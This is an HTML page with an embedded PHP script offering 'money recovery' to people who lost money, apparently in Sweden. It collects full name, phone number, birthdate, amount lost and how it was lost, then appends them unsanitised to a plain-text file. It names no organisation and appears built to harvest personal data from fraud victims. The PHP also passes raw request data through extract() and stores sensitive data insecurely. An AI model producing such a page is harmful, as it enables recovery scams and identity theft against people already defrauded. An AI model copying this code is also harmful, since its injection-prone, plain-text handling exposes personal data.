<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;0,900;1,400;1,700;1,900&display=swap" rel="stylesheet">

   <style>
    body{
        height: 130vh;
    }
        *{
            margin: auto;
            background: #081926;
            color: white;
            text-align: center;
            line-height: 3.5vh;
            font-family: 'Lato', sans-serif;
        }
        input{
            text-align: left;
            border: solid 2px white;
            padding: 7px;
            font-size: 15px;
            margin-top: 2%;
        }
        .box p{
            margin-top: 3%;
        }
        input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
    -webkit-appearance: none;
    margin: 0;
}
        input:active{
            border: 2px solid white;
        }
        textarea{
            text-align: left;
        }
        .box{
            width: 50%;
            height: 60vh;
            margin-top: 1%;
}
.upper-body{
    text-align: center;
    margin-top: 7%;
}
.submit-button{
    display: block; font-size: 19px; margin: 0 auto; padding-left: 5vh; padding-right: 5vh; margin-top: 2%; cursor: pointer; background-color: #FEAE11; color: #081926; border: 2px solid wheat;
}
.submit-button:hover{
    background-color: #081926;
    border: 2px solid #FEAE11;
    color: #FEAE11;
    transition-duration: 1s;
}
    </style>
</head>
<body>
    <div class="upper-body">
    <h1>Apply for money recovery</h1>
    <br>
    <p>Fill out the form below with your informations on how you lost the money</p>
</div>
    <div class="box">
       <form action="">
        <p>Full Name</p>
        <input type="text" name="name" autocomplete="off" placeholder="Full Name" required>
        <p>Phone Number</p>
        <input type="number" name="phone" autocomplete="off" value="46" placeholder="Phone Number" required>
        <p>Birthdate</p>
        <input type="date" name="birthdate" autocomplete="off" required style="display: block;">
        <p>Write the amount of the lost money in SEK here</p>
        <input type="number" name="amount" autocomplete="off" placeholder="Amount" required>
        <p>Describe how you lost the money and if you can where</p>
        <textarea name="description" id="description" cols="70" rows="10"></textarea>
        <input class="submit-button" type="submit" value="Submit">
    </form>
    </div>
</body>
</html>
<?php 
extract($_REQUEST);
$file=fopen("saved.txt", "a");

fwrite($file, "Full Name :");
fwrite($file, $name ."\n");
fwrite($file, "Phone Number:");
fwrite($file, $phone ."\n");
fwrite($file, "Birthdate :");
fwrite($file, $birthdate ."\n");
fwrite($file, "Lost :");
fwrite($file, $amount ."\n");
fwrite($file, "Description :");
fwrite($file, $description ."\n");
fclose($file);
?>
